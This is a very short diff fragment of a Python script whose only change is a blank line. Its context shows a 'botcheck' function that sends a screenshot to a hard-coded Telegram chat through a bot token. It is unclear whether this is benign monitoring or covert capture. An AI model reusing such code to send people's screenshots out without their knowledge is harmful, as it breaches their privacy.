@@ -7,3 +7,4 @@ BOT_URL = '900081399'
 def botcheck(screenshot):
     bot = telebot.TeleBot(token, parse_mode=None)
     bot.send_photo(BOT_URL, screenshot)
+
